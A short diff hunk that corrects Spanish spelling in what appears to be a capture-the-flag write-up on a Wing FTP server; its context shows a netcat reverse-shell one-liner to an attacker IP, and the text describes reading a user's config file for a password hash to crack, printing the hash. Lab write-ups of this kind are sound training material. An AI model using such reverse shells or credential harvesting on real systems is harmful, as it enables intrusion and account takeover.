@@ -37,7 +37,7 @@ busybox nc 10.10.15.216 443 -e sh
 
 
 Obtenemos una shell como como el usuario `wingftp`
-En la rutA `/opt/wftpserver/Data/1/users` encontramos archivos de configuracion de diferentes usuarios, en este caso leeremos el de `wacky` en el cual entromas un hash el cual podremos romper
+En la ruta `/opt/wftpserver/Data/1/users` encontramos archivos de configuración de diferentes usuarios, en este caso leeremos el de `wacky` en el cual encontramos un hash el cual podremos romper
 ```
 32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca
 ```
